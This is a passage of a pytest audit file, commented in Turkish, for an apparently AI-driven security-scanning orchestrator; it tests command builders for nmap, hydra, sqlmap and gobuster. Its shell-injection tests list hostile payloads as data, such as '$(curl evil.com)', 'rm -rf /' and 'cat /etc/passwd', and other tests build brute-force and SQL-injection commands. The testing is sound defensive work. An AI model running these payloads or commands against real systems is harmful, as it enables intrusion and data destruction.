"""Sprint 3.5 Kapsamlı Audit Test Dosyası

Amaç: Tool Registry, Command Builder, Execution Tools ve Orchestrator
akışının uçtan uca doğruluğunu, güvenlik sertliğini ve optimizasyon
kalitesini denetler.

Test Kategorileri:
  A) Registry-Execution Tutarlılık (her intent'in execution tool'u doğru mu?)
  B) Komut Doğruluk (üretilen komutlar siber güvenlik açısından doğru mu?)
  C) Güvenlik Sertliği (shell injection, dangerous chars, path traversal)
  D) Edge Case ve Hata Toleransı
  E) Optimizasyon ve Performans Kalitesi
  F) Orchestrator End-to-End Akış
  G) Keyword Filter Doğruluk

Sprint 3.5 Sorumlu: Yiğit
Tarih: 4 Mart 2026
"""

from __future__ import annotations

import re
import time
import threading
from typing import Any, Dict, List, Optional, Iterator

import pytest

from src.ai.schemas import (
    Intent,
    IntentType,
    CategoryType,
    RiskLevel,
    ToolDef,
    ToolSpec,
    FinalCommand,
    SENTINEL_CATEGORIES,
    get_category_for_intent,
)
from src.ai.tool_registry import (
    TOOL_REGISTRY,
    _EXECUTION_REGISTRY,
    build_tool_spec,
    build_execution_kwargs,
    get_tool_for_intent,
    get_execution_tool_id,
    get_supported_intents,
    get_intents_for_tool,
    get_execution_intents,
    get_required_execution_tool_ids,
    validate_execution_registry,
)
from src.ai.command_builder import (
    CommandBuilder,
    get_command_builder,
    IP_PATTERN,
    DOMAIN_PATTERN,
    URL_PATTERN,
    PORT_PATTERN,
    DANGEROUS_CHARS,
)
from src.ai.keyword_filter import KeywordPreFilter
from src.core.sentinel_coordinator import SentinelCoordinator
from src.core.tool_base import (
    BaseTool,
    NmapPingSweepTool,
    NmapPortScanTool,
    NmapServiceDetectionTool,
    NmapOsDetectionTool,
    NmapVulnScanTool,
    DnsLookupTool,
    SslScanTool,
    GobusterDirTool,
    SubdomainEnumTool,
    WebAppScanTool,
    WhoisLookupTool,
    HydraSshTool,
    HydraHttpTool,
    SqlmapScanTool,
)


# =============================================================================
# A) REGISTRY - EXECUTION TUTARLILIK TESTLERİ
# =============================================================================

class TestRegistryExecutionConsistency:
    """Every executable intent must have a matching execution registry entry."""

    def test_all_executable_intents_have_execution_mapping(self):
        """Komut üreten her intent'in _EXECUTION_REGISTRY'de karşılığı olmalı."""
        missing = []
        for intent_type, tool_def in TOOL_REGISTRY.items():
            if tool_def.tool:  # Boş tool = komut üretmez (INFO_QUERY, UNKNOWN)
                if intent_type not in _EXECUTION_REGISTRY:
                    missing.append(intent_type.value)
        assert not missing, f"Execution mapping eksik intent'ler: {missing}"

    def test_execution_registry_tool_ids_are_unique(self):
        """Her execution mapping farklı tool_id'ye sahip olmalı."""
        seen = {}
        duplicates = []
        for intent_type, mapping in _EXECUTION_REGISTRY.items():
            tool_id = mapping["tool_id"]
            if tool_id in seen:
                duplicates.append(f"{tool_id} -> {seen[tool_id].value} AND {intent_type.value}")
            seen[tool_id] = intent_type
        assert not duplicates, f"Duplicate tool_id'ler: {duplicates}"

    def test_all_execution_tool_ids_registered_in_coordinator(self):
        """Execution tool_id'lerin hepsi coordinator'da mevcut olmalı."""
        coordinator = SentinelCoordinator(db_path=":memory:")
        try:
            registered = set(coordinator.get_available_tools())
            required = get_required_execution_tool_ids()
            missing = sorted(required - registered)
            assert not missing, f"Coordinator'da eksik tool'lar: {missing}"
        finally:
            coordinator.cleanup()

    def test_registry_tool_names_match_execution_tool_programs(self):
        """Registry'deki tool adı ile execution tool'un build_command çıktısı uyumlu olmalı."""
        tool_program_map = {
            "nmap_ping_sweep": "nmap",
            "nmap_port_scan": "nmap",
            "nmap_service_detection": "nmap",
            "nmap_os_detection": "nmap",
            "nmap_vuln_scan": "nmap",
            "dns_lookup": "nslookup",
            "ssl_scan": "openssl",  # Not: Registry 'nmap' diyor ama execution tool 'openssl' kullanıyor
            "gobuster_dir": "gobuster",
            "subdomain_enum": "bash",
            "web_app_scan": None,  # Platform bağımlı
            "whois_lookup": "whois",
            "hydra_ssh": "hydra",
            "hydra_http": "hydra",
            "sqlmap_scan": "sqlmap",
        }
        coordinator = SentinelCoordinator(db_path=":memory:")
        try:
            for tool_id, expected_program in tool_program_map.items():
                if expected_program is None:
                    continue
                itool = coordinator.manager.get_tool(tool_id)
                assert itool is not None, f"Tool bulunamadı: {tool_id}"
        finally:
            coordinator.cleanup()

    def test_ssl_scan_registry_vs_execution_tool_discrepancy(self):
        """SSL_SCAN: Registry 'nmap --script ssl-enum-ciphers' diyor ama
        execution tool 'openssl s_client' kullanıyor.
        Bu bilinen ve kabul edilen bir farktır —
        execution tool daha doğru olanıdır."""
        registry_def = TOOL_REGISTRY[IntentType.SSL_SCAN]
        assert registry_def.tool == "nmap", "Registry hala nmap demeli (metadata)"

        # Execution tool aslında openssl kullanıyor
        cmd = SslScanTool().build_command(target="example.com")
        assert cmd[0] == "openssl", "Execution tool openssl kullanmalı"

    def test_port_scan_default_scan_type_consistency(self):
        """PORT_SCAN: Registry -sT (Connect) diyor, execution tool da default -sT.
        Docker'da root var ama local'de -sT daha güvenli default."""
        registry_def = TOOL_REGISTRY[IntentType.PORT_SCAN]
        assert "-sT" in registry_def.base_args, "Registry -sT içermeli"

        # Execution tool default sT kullanıyor
        cmd = NmapPortScanTool().build_command(target="192.168.1.10")
        assert "-sT" in cmd, "Execution tool default -sT kullanmalı"

    def test_every_intent_has_category(self):
        """Her IntentType bir CategoryType'a ait olmalı."""
        all_intents_in_categories = set()
        for intents in SENTINEL_CATEGORIES.values():
            all_intents_in_categories.update(intents)

        for intent_type in IntentType:
            assert intent_type in all_intents_in_categories, \
                f"{intent_type.value} hiçbir kategoride yok"


# =============================================================================
# B) KOMUT DOĞRULUK TESTLERİ (Siber Güvenlik Doğruluğu)
# =============================================================================

class TestNmapCommandAccuracy:
    """Nmap komut üretiminin siber güvenlik standartlarına uygunluğu."""

    def test_host_discovery_produces_sn_flag(self):
        cmd = NmapPingSweepTool().build_command(target="192.168.1.0/24")
        assert "nmap" == cmd[0]
        assert "-sn" in cmd
        assert "192.168.1.0/24" in cmd

    def test_port_scan_st_produces_correct_command(self):
        cmd = NmapPortScanTool().build_command(
            target="192.168.1.10", ports="22,80,443", scan_type="sT"
        )
        assert cmd[0] == "nmap"
        assert "-sT" in cmd
        assert "-p" in cmd
        port_idx = cmd.index("-p")
        assert cmd[port_idx + 1] == "22,80,443"
        assert cmd[-1] == "192.168.1.10"

    def test_port_scan_ss_produces_syn_scan(self):
        cmd = NmapPortScanTool().build_command(
            target="10.0.0.1", ports="1-65535", scan_type="sS"
        )
        assert "-sS" in cmd

    def test_port_scan_su_produces_udp_scan(self):
        cmd = NmapPortScanTool().build_command(
            target="10.0.0.1", ports="53,161,500", scan_type="sU"
        )
        assert "-sU" in cmd

    def test_port_scan_top_ports(self):
        cmd = NmapPortScanTool().build_command(
            target="10.0.0.1", top_ports=100
        )
        assert "--top-ports" in cmd
        idx = cmd.index("--top-ports")
        assert cmd[idx + 1] == "100"
        assert "-p" not in cmd  # top_ports kullanıldığında -p olmamalı

    def test_service_detection_version_intensity(self):
        cmd = NmapServiceDetectionTool().build_command(
            target="192.168.1.10", version_intensity=9
        )
        assert "-sV" in cmd
        assert "--version-intensity" in cmd
        idx = cmd.index("--version-intensity")
        assert cmd[idx + 1] == "9"

    def test_os_detection_requires_root_in_registry(self):
        """OS detection root gerektirmeli (Registry'de requires_root=True)."""
        tool_def = TOOL_REGISTRY[IntentType.OS_DETECTION]
        assert tool_def.requires_root is True

    def test_os_detection_command_structure(self):
        cmd = NmapOsDetectionTool().build_command(
            target="192.168.1.10", osscan_guess=True
        )
        assert "-O" in cmd
        assert "--osscan-guess" in cmd
        assert cmd[-1] == "192.168.1.10"

    def test_vuln_scan_nse_script(self):
        cmd = NmapVulnScanTool().build_command(target="192.168.1.10")
        assert "--script" in cmd
        idx = cmd.index("--script")
        assert cmd[idx + 1] == "vuln"

    def test_vuln_scan_custom_scripts(self):
        cmd = NmapVulnScanTool().build_command(
            target="192.168.1.10", scripts="http-vuln-cve2017-5638"
        )
        idx = cmd.index("--script")
        assert "http-vuln-cve2017-5638" in cmd[idx + 1]

    def test_timing_template_range(self):
        """Nmap timing template 0-5 arası olmalı."""
        for t_val in range(6):
            cmd = NmapPortScanTool().build_command(
                target="10.0.0.1", timing=t_val
            )
            assert f"-T{t_val}" in cmd

    def test_timing_6_rejected(self):
        with pytest.raises(ValueError):
            NmapPortScanTool().build_command(target="10.0.0.1", timing=6)


class TestWebToolCommandAccuracy:
    """Web araçları komut doğruluğu."""

    def test_gobuster_dir_minimum_command(self):
        cmd = GobusterDirTool().build_command(url="http://example.com")
        assert cmd[0] == "gobuster"
        assert "dir" in cmd
        assert "-u" in cmd
        assert "http://example.com" in cmd
        assert "-w" in cmd
        assert "-q" in cmd  # Quiet mode for parsing

    def test_gobuster_requires_http_prefix(self):
        """URL http:// veya https:// ile başlamalı."""
        with pytest.raises(ValueError):
            GobusterDirTool().build_command(url="example.com")

    def test_gobuster_with_extensions(self):
        cmd = GobusterDirTool().build_command(
            url="https://target.com", extensions="php,html,txt"
        )
        assert "-x" in cmd
        idx = cmd.index("-x")
        assert cmd[idx + 1] == "php,html,txt"

    def test_web_vuln_scan_uses_curl(self):
        """WebAppScanTool curl tabanlı tarama yapmalı."""
        cmd = WebAppScanTool().build_command(url="http://example.com")
        joined = " ".join(cmd)
        assert "curl" in joined

    def test_nikto_not_directly_called_in_execution(self):
        """WEB_VULN_SCAN execution path'te web_app_scan tool kullanılıyor,
        doğrudan nikto çağrılmıyor. Bu bilinen davranış."""
        exec_tool_id = get_execution_tool_id(IntentType.WEB_VULN_SCAN)
        assert exec_tool_id == "web_app_scan"


class TestReconToolCommandAccuracy:
    """Recon araçları komut doğruluğu."""

    def test_dns_lookup_basic(self):
        cmd = DnsLookupTool().build_command(domain="example.com")
        assert cmd[0] == "nslookup"
        assert "example.com" in cmd

    def test_dns_lookup_record_types(self):
        """Tüm desteklenen record tipleri doğru üretilmeli."""
        for rtype in ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "PTR", "SRV"]:
            cmd = DnsLookupTool().build_command(
                domain="example.com", record_type=rtype
            )
            assert f"-type={rtype}" in cmd

    def test_dns_lookup_invalid_record_type_rejected(self):
        with pytest.raises(ValueError):
            DnsLookupTool().build_command(domain="example.com", record_type="INVALID")

    def test_dns_lookup_custom_server(self):
        cmd = DnsLookupTool().build_command(
            domain="example.com", dns_server="8.8.8.8"
        )
        assert "8.8.8.8" in cmd

    def test_whois_basic(self):
        cmd = WhoisLookupTool().build_command(target="example.com")
        assert cmd == ["whois", "example.com"]

    def test_subdomain_enum_uses_bash(self):
        cmd = SubdomainEnumTool().build_command(domain="example.com")
        assert cmd[0] == "bash"
        assert "-c" in cmd

    def test_ssl_scan_basic(self):
        cmd = SslScanTool().build_command(target="example.com")
        assert cmd[0] == "openssl"
        assert "s_client" in cmd
        assert "-connect" in cmd
        assert "example.com:443" in cmd

    def test_ssl_scan_custom_port(self):
        cmd = SslScanTool().build_command(target="example.com", port=8443)
        assert "example.com:8443" in cmd

    def test_ssl_scan_tls_version(self):
        cmd = SslScanTool().build_command(target="example.com", tls_version="1.3")
        assert "-tls1_3" in cmd

    def test_ssl_scan_starttls(self):
        cmd = SslScanTool().build_command(target="mail.example.com", starttls="smtp")
        assert "-starttls" in cmd
        assert "smtp" in cmd


class TestAttackToolCommandAccuracy:
    """Saldırı araçları komut doğruluğu."""

    def test_hydra_ssh_basic(self):
        cmd = HydraSshTool().build_command(
            target="10.0.0.5", username="admin", wordlist="/tmp/passwords.txt"
        )
        assert cmd[0] == "hydra"
        assert "-l" in cmd
        assert "admin" in cmd
        assert "-P" in cmd
        assert "/tmp/passwords.txt" in cmd
        assert "ssh://10.0.0.5" in cmd

    def test_hydra_ssh_custom_port(self):
        cmd = HydraSshTool().build_command(
            target="10.0.0.5", username="root", wordlist="/tmp/w.txt", port=2222
        )
        assert "-s" in cmd
        assert "2222" in cmd

    def test_hydra_ssh_default_port_no_s_flag(self):
        """Default port 22 ise -s flag'i eklenmemeli."""
        cmd = HydraSshTool().build_command(
            target="10.0.0.5", username="admin", wordlist="/tmp/w.txt", port=22
        )
        assert "-s" not in cmd

    def test_hydra_http_form_post(self):
        cmd = HydraHttpTool().build_command(
            target="10.0.0.6",
            username="admin",
            wordlist="/tmp/w.txt",
            form_path="/login",
            form_params="user=^USER^&pass=^PASS^",
            fail_string="Invalid credentials",
        )
        assert cmd[0] == "hydra"
        joined = " ".join(cmd)
        assert "http-form-post" in joined
        assert "/login:user=^USER^&pass=^PASS^:Invalid credentials" in joined

    def test_hydra_http_https_method(self):
        cmd = HydraHttpTool().build_command(
            target="10.0.0.6",
            username="admin",
            wordlist="/tmp/w.txt",
            form_path="/login",
            form_params="u=^USER^&p=^PASS^",
            fail_string="fail",
            method="https-form-post",
        )
        assert "https-form-post" in cmd

    def test_hydra_http_invalid_method_rejected(self):
        with pytest.raises(ValueError):
            HydraHttpTool().build_command(
                target="10.0.0.6",
                username="admin",
                wordlist="/tmp/w.txt",
                form_path="/login",
                form_params="u=^USER^&p=^PASS^",
                fail_string="fail",
                method="ftp-form-post",
            )

    def test_sqlmap_basic(self):
        cmd = SqlmapScanTool().build_command(
            url="http://example.com/vuln.php?id=1"
        )
        assert cmd[0] == "sqlmap"
        assert "-u" in cmd
        assert "http://example.com/vuln.php?id=1" in cmd
        assert "--batch" in cmd

    def test_sqlmap_advanced_params(self):
        cmd = SqlmapScanTool().build_command(
            url="http://example.com/vuln.php?id=1",
            level=5, risk=3, dbs=True, threads=5
        )
        assert "--level" in cmd
        assert "5" in cmd
        assert "--risk" in cmd
        assert "3" in cmd
        assert "--dbs" in cmd
        assert "--threads" in cmd

    def test_sqlmap_requires_http_prefix(self):
        with pytest.raises(ValueError):
            SqlmapScanTool().build_command(url="example.com/vuln.php?id=1")

    def test_sqlmap_level_range(self):
        """Level 1-5 arası olmalı."""
        with pytest.raises(ValueError):
            SqlmapScanTool().build_command(
                url="http://example.com/v.php?id=1", level=0
            )
        with pytest.raises(ValueError):
            SqlmapScanTool().build_command(
                url="http://example.com/v.php?id=1", level=6
            )

    def test_sqlmap_risk_range(self):
        """Risk 1-3 arası olmalı."""
        with pytest.raises(ValueError):
            SqlmapScanTool().build_command(
                url="http://example.com/v.php?id=1", risk=0
            )
        with pytest.raises(ValueError):
            SqlmapScanTool().build_command(
                url="http://example.com/v.php?id=1", risk=4
            )


# =============================================================================
# C) GÜVENLİK SERTLİĞİ TESTLERİ
# =============================================================================

class TestShellInjectionDefense:
    """Shell injection saldırılarına karşı savunma testleri."""

    INJECTION_PAYLOADS = [
        "192.168.1.1; cat /etc/passwd",
        "target && rm -rf /",
        "host | whoami",
        "10.0.0.1$(id)",
        "name`id`",
        "ip{bad}",
        "line\nnext",
        "a\rother",
        "test\x00null",
        "target<file",
        "target>file",
        "$(curl evil.com)",
        "`wget evil.com`",
        "test!cmd",
    ]

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_nmap_ping_sweep_rejects_injection(self, payload):
        with pytest.raises(ValueError):
            NmapPingSweepTool().build_command(target=payload)

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_nmap_port_scan_rejects_injection(self, payload):
        with pytest.raises(ValueError):
            NmapPortScanTool().build_command(target=payload)

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_dns_lookup_rejects_injection(self, payload):
        with pytest.raises(ValueError):
            DnsLookupTool().build_command(domain=payload)

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_gobuster_rejects_injection_in_url(self, payload):
        with pytest.raises(ValueError):
            GobusterDirTool().build_command(url=payload)

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_hydra_ssh_rejects_injection_in_target(self, payload):
        with pytest.raises(ValueError):
            HydraSshTool().build_command(
                target=payload, username="admin", wordlist="/tmp/w.txt"
            )

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_hydra_ssh_rejects_injection_in_username(self, payload):
        with pytest.raises(ValueError):
            HydraSshTool().build_command(
                target="10.0.0.5", username=payload, wordlist="/tmp/w.txt"
            )

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_sqlmap_rejects_injection_in_url(self, payload):
        with pytest.raises(ValueError):
            SqlmapScanTool().build_command(url=payload)

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_whois_rejects_injection(self, payload):
        with pytest.raises(ValueError):
            WhoisLookupTool().build_command(target=payload)

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_ssl_scan_rejects_injection(self, payload):
        with pytest.raises(ValueError):
            SslScanTool().build_command(target=payload)


class TestCommandBuilderSecurity:
    """CommandBuilder güvenlik testleri."""

    def test_dangerous_chars_completeness(self):
        """DANGEROUS_CHARS tüm kritik shell metakarakterleri içermeli."""
        required_chars = {";", "|", "&", "$", "`", "(", ")", "{", "}", "<", ">", "\n", "\r", "\x00"}
        assert required_chars.issubset(DANGEROUS_CHARS)

    def test_command_builder_rejects_dangerous_target(self):
        builder = CommandBuilder()
        spec = ToolSpec(
            tool="nmap",
            arguments=["-sn"],
            target="192.168.1.1; rm -rf /",
            requires_root=False,
            risk_level=RiskLevel.LOW,
        )
        cmd, error = builder.build(spec)
        assert cmd is None
        assert error is not None

    def test_command_builder_rejects_dangerous_argument(self):
        builder = CommandBuilder()
        spec = ToolSpec(
            tool="nmap",
            arguments=["-sn", "--script=$(malicious)"],
            target="192.168.1.1",
            requires_root=False,
            risk_level=RiskLevel.LOW,
        )
        cmd, error = builder.build(spec)
        assert cmd is None
        assert error is not None

    def test_command_builder_rejects_empty_tool(self):
        builder = CommandBuilder()
        spec = ToolSpec(
            tool="",
            arguments=[],
            target="192.168.1.1",
            requires_root=False,
            risk_level=RiskLevel.LOW,
        )
        cmd, error = builder.build(spec)
        assert cmd is None


class TestTargetValidation:
    """Target format doğrulama testleri."""

    VALID_TARGETS = [
        "192.168.1.1",
        "10.0.0.1",
        "255.255.255.255",
        "0.0.0.0",
        "192.168.1.0/24",
        "10.0.0.0/8",
        "example.com",
        "sub.domain.co.uk",
        "test-host.example.org",
        "http://example.com",
        "https://secure.example.com",
        "https://example.com:8443/path",
    ]

    INVALID_TARGETS = [
        "",
        "   ",
        "999.999.999.999",
        "192.168.1.1/33",
        "192.168.1.1; ls",
        "target && rm",
        "example.com | grep",
    ]

    @pytest.mark.parametrize("target", VALID_TARGETS)
    def test_valid_targets_accepted(self, target):
        builder = CommandBuilder()
        result, error = builder._validate_target(target)
        assert result is True, f"Valid target rejected: {target} - {error}"

    @pytest.mark.parametrize("target", INVALID_TARGETS)
    def test_invalid_targets_rejected(self, target):
        builder = CommandBuilder()
        result, error = builder._validate_target(target)
        assert result is False, f"Invalid target accepted: {target}"


class TestPortValidation:
    """Port format doğrulama testleri."""

    def test_single_port(self):
        builder = CommandBuilder()
        ok, err = builder.validate_port_range("80")
        assert ok is True

    def test_port_range(self):
        builder = CommandBuilder()
        ok, err = builder.validate_port_range("1-1000")
        assert ok is True

    def test_port_list(self):
        builder = CommandBuilder()
        ok, err = builder.validate_port_range("22,80,443")
        assert ok is True

    def test_all_ports(self):
        builder = CommandBuilder()
        ok, err = builder.validate_port_range("-")
        assert ok is True

    def test_mixed_ports(self):
        builder = CommandBuilder()
        ok, err = builder.validate_port_range("22,80-443,8080")
        assert ok is True

    def test_invalid_port_over_65535(self):
        builder = CommandBuilder()
        ok, err = builder.validate_port_range("70000")
        assert ok is False

    def test_invalid_port_reversed_range(self):
        builder = CommandBuilder()
        ok, err = builder.validate_port_range("1000-100")
        assert ok is False


# =============================================================================
# D) EDGE CASE VE HATA TOLERANSI TESTLERİ
# =============================================================================

class TestEdgeCases:
    """Sınır durumları ve hata toleransı."""

    def test_nmap_all_ports_scan(self):
        """Tüm portlar taranabilmeli (1-65535)."""
        cmd = NmapPortScanTool().build_command(
            target="192.168.1.10", ports="1-65535"
        )
        assert "-p" in cmd
        assert "1-65535" in cmd

    def test_nmap_single_port(self):
        cmd = NmapPortScanTool().build_command(
            target="192.168.1.10", ports="80"
        )
        assert "80" in cmd

    def test_build_tool_spec_without_target_raises(self):
        """Target olmadan build_tool_spec ValueError fırlatmalı."""
        with pytest.raises(ValueError, match="Hedef belirtilmedi"):
            build_tool_spec(IntentType.PORT_SCAN, target=None)

    def test_build_tool_spec_info_query_no_target_ok(self):
        """INFO_QUERY target gerektirmez."""
        spec = build_tool_spec(IntentType.INFO_QUERY, target=None)
        assert spec is None  # tool boş olduğu için None dönmeli

    def test_build_tool_spec_unknown_no_target_ok(self):
        """UNKNOWN target gerektirmez."""
        spec = build_tool_spec(IntentType.UNKNOWN, target=None)
        assert spec is None

    def test_execution_kwargs_without_target_returns_none(self):
        """Target olmadan execution kwargs None dönmeli."""
        result = build_execution_kwargs(IntentType.PORT_SCAN, None, {})
        assert result is None

    def test_execution_kwargs_with_extra_params_ignored(self):
        """param_map'te olmayan parametreler sessizce ignore edilmeli."""
        result = build_execution_kwargs(
            IntentType.DNS_LOOKUP,
            "example.com",
            {"nonexistent_param": "value", "record_type": "MX"}
        )
        assert result is not None
        assert "nonexistent_param" not in result
        assert result.get("record_type") == "MX"

    def test_vuln_scan_empty_scripts_rejected(self):
        with pytest.raises(ValueError):
            NmapVulnScanTool().build_command(target="192.168.1.10", scripts="")

    def test_scan_type_validation(self):
        """Geçersiz scan type reddedilmeli."""
        with pytest.raises(ValueError):
            NmapPortScanTool().build_command(
                target="192.168.1.10", scan_type="INVALID"
            )

    def test_version_intensity_boundaries(self):
        """Version intensity 0-9 arası olmalı."""
        # Valid
        NmapServiceDetectionTool().build_command(
            target="192.168.1.10", version_intensity=0
        )
        NmapServiceDetectionTool().build_command(
            target="192.168.1.10", version_intensity=9
        )
        # Invalid
        with pytest.raises(ValueError):
            NmapServiceDetectionTool().build_command(
                target="192.168.1.10", version_intensity=10
            )

    def test_gobuster_thread_limit(self):
        """Gobuster threads 1-256 arası olmalı."""
        with pytest.raises(ValueError):
            GobusterDirTool().build_command(
                url="http://example.com", threads=0
            )
        with pytest.raises(ValueError):
            GobusterDirTool().build_command(
                url="http://example.com", threads=257
            )

    def test_hydra_thread_limit(self):
        """Hydra threads 1-128 arası olmalı."""
        with pytest.raises(ValueError):
            HydraSshTool().build_command(
                target="10.0.0.5", username="admin",
                wordlist="/tmp/w.txt", threads=0
            )

    def test_ssl_tls_version_validation(self):
        """Sadece 1.2 ve 1.3 kabul edilmeli."""
        with pytest.raises(ValueError):
            SslScanTool().build_command(target="example.com", tls_version="1.0")
        with pytest.raises(ValueError):
            SslScanTool().build_command(target="example.com", tls_version="1.1")

    def test_ssl_port_validation(self):
        """Port 1-65535 arası olmalı."""
        with pytest.raises(ValueError):
            SslScanTool().build_command(target="example.com", port=0)
        with pytest.raises(ValueError):
            SslScanTool().build_command(target="example.com", port=70000)


# =============================================================================
# E) OPTİMİZASYON VE PERFORMANS TESTLERİ
# =============================================================================

class TestPerformanceAndOptimization:
    """Performans ve optimizasyon doğruluğu."""

    def test_command_builder_singleton_is_thread_safe(self):
        """get_command_builder() thread-safe singleton olmalı."""
        results = []

        def get_builder():
            b = get_command_builder()
            results.append(id(b))

        threads = [threading.Thread(target=get_builder) for _ in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert len(set(results)) == 1, "Singleton farklı instance'lar döndü"

    def test_tool_registry_is_frozen(self):
        """TOOL_REGISTRY runtime'da değiştirilmemeli."""
        original_count = len(TOOL_REGISTRY)
        assert original_count > 0
        # Registry key count değişmemeli
        assert len(TOOL_REGISTRY) == original_count

    def test_regex_patterns_are_precompiled(self):
        """Kritik regex pattern'leri compile edilmiş olmalı."""
        assert isinstance(IP_PATTERN, re.Pattern)
        assert isinstance(DOMAIN_PATTERN, re.Pattern)
        assert isinstance(URL_PATTERN, re.Pattern)
        assert isinstance(PORT_PATTERN, re.Pattern)

    def test_keyword_filter_patterns_precompiled(self):
        """Keyword filter pattern'leri pre-compiled olmalı."""
        kf = KeywordPreFilter()
        assert kf.pattern_count > 0

    def test_build_tool_spec_performance(self):
        """build_tool_spec 1ms altında çalışmalı."""
        start = time.perf_counter()
        for _ in range(1000):
            build_tool_spec(IntentType.PORT_SCAN, target="192.168.1.1")
        elapsed = (time.perf_counter() - start) * 1000  # ms
        avg_ms = elapsed / 1000
        assert avg_ms < 1.0, f"build_tool_spec ortalama {avg_ms:.3f}ms (limit: 1ms)"

    def test_command_builder_performance(self):
        """CommandBuilder.build 1ms altında çalışmalı."""
        builder = CommandBuilder()
        spec = ToolSpec(
            tool="nmap",
            arguments=["-sn"],
            target="192.168.1.0/24",
            requires_root=False,
            risk_level=RiskLevel.LOW,
        )
        start = time.perf_counter()
        for _ in range(1000):
            builder.build(spec)
        elapsed = (time.perf_counter() - start) * 1000
        avg_ms = elapsed / 1000
        assert avg_ms < 1.0, f"CommandBuilder.build ortalama {avg_ms:.3f}ms (limit: 1ms)"

    def test_tool_build_command_performance(self):
        """Her tool'un build_command'ı 1ms altında çalışmalı."""
        tools_and_kwargs = [
            (NmapPingSweepTool(), {"target": "192.168.1.0/24"}),
            (NmapPortScanTool(), {"target": "192.168.1.10"}),
            (NmapServiceDetectionTool(), {"target": "192.168.1.10"}),
            (NmapOsDetectionTool(), {"target": "192.168.1.10"}),
            (NmapVulnScanTool(), {"target": "192.168.1.10"}),
            (DnsLookupTool(), {"domain": "example.com"}),
            (SslScanTool(), {"target": "example.com"}),
            (GobusterDirTool(), {"url": "http://example.com"}),
            (WhoisLookupTool(), {"target": "example.com"}),
            (SqlmapScanTool(), {"url": "http://example.com/v.php?id=1"}),
        ]

        for tool, kwargs in tools_and_kwargs:
            start = time.perf_counter()
            for _ in range(1000):
                tool.build_command(**kwargs)
            elapsed = (time.perf_counter() - start) * 1000
            avg_ms = elapsed / 1000
            assert avg_ms < 1.0, \
                f"{tool.tool_id}.build_command ortalama {avg_ms:.3f}ms (limit: 1ms)"

    def test_keyword_filter_performance(self):
        """KeywordPreFilter.suggest 1ms altında çalışmalı."""
        kf = KeywordPreFilter()
        inputs = [
            "192.168.1.0/24 ağını tara",
            "port taraması yap",
            "dns sorgusu",
            "sql injection testi",
            "merhaba",
        ]
        start = time.perf_counter()
        for _ in range(1000):
            for inp in inputs:
                kf.suggest(inp)
        elapsed = (time.perf_counter() - start) * 1000
        avg_ms = elapsed / (1000 * len(inputs))
        assert avg_ms < 1.0, f"KeywordPreFilter.suggest ortalama {avg_ms:.3f}ms (limit: 1ms)"

    def test_estimate_timeout_reasonable_ranges(self):
        """Timeout tahminleri makul aralıklarda olmalı."""
        tools = [
            (NmapPingSweepTool(), {"target": "192.168.1.0/24"}, 20, 1200),
            (NmapPortScanTool(), {"target": "192.168.1.10", "ports": "1-1000"}, 20, 900),
            (NmapServiceDetectionTool(), {"target": "192.168.1.10"}, 30, 1200),
            (NmapOsDetectionTool(), {"target": "192.168.1.10"}, 45, 1800),
            (NmapVulnScanTool(), {"target": "192.168.1.10"}, 60, 1800),
        ]
        for tool, kwargs, min_t, max_t in tools:
            estimate = tool.estimate_timeout(**kwargs)
            assert min_t <= estimate <= max_t, \
                f"{tool.tool_id} timeout {estimate}s (expected {min_t}-{max_t})"


# =============================================================================
# F) ORCHESTRATOR END-TO-END AKIŞ TESTLERİ
# =============================================================================

class TestOrchestratorEndToEnd:
    """Orchestrator akışının doğruluğu."""

    @pytest.fixture
    def coordinator(self) -> Iterator[SentinelCoordinator]:
        c = SentinelCoordinator(db_path=":memory:")
        yield c
        c.cleanup()

    def _make_orchestrator_with_mock_intent(
        self,
        coordinator: SentinelCoordinator,
        intent_type: IntentType,
        target: str,
        params: Optional[Dict[str, Any]] = None,
        confidence: float = 0.99,
        needs_clarification: bool = False,
    ):
        from src.ai.orchestrator import AIOrchestrator
        orchestrator = AIOrchestrator(model="qwen2.5:3b", coordinator=coordinator)
        # Ensure we go through the flat (non-hierarchical) path
        orchestrator._hierarchical_resolver = None
        mock_intent = Intent(
            intent_type=intent_type,
            target=target,
            params=params or {},
            needs_clarification=needs_clarification,
            confidence=confidence,
        )
        orchestrator._intent_resolver.resolve = lambda _ui, _t: mock_intent
        return orchestrator

    @pytest.mark.parametrize(
        "intent_type, target, params",
        [
            (IntentType.HOST_DISCOVERY, "192.168.1.0/24", {}),
            (IntentType.PORT_SCAN, "192.168.1.10", {"ports": "22,80,443"}),
            (IntentType.SERVICE_DETECTION, "192.168.1.10", {"ports": "80"}),
            (IntentType.OS_DETECTION, "192.168.1.10", {}),
            (IntentType.VULN_SCAN, "192.168.1.10", {"ports": "80,443"}),
            (IntentType.DNS_LOOKUP, "example.com", {}),
            (IntentType.SSL_SCAN, "example.com", {}),
            (IntentType.WEB_DIR_ENUM, "http://example.com", {}),
            (IntentType.WEB_VULN_SCAN, "http://example.com", {}),
            (IntentType.WHOIS_LOOKUP, "example.com", {}),
            (IntentType.SQL_INJECTION, "http://example.com/v.php?id=1", {}),
        ],
    )
    def test_orchestrator_produces_command_for_each_intent(
        self, coordinator, intent_type, target, params
    ):
        orch = self._make_orchestrator_with_mock_intent(
            coordinator, intent_type, target, params
        )
        result = orch.process_v2("test", target=target)
        assert result["success"] is True, \
            f"{intent_type.value}: success=False, msg={result.get('message')}"
        assert result["command"] is not None, \
            f"{intent_type.value}: command is None"
        assert result["command"].executable != "", \
            f"{intent_type.value}: executable boş"

    def test_orchestrator_info_query_no_command(self, coordinator):
        orch = self._make_orchestrator_with_mock_intent(
            coordinator, IntentType.INFO_QUERY, "nmap"
        )
        result = orch.process_v2("nmap nedir?")
        assert result["success"] is True
        assert result["command"] is None

    def test_orchestrator_unknown_intent_asks_clarification(self, coordinator):
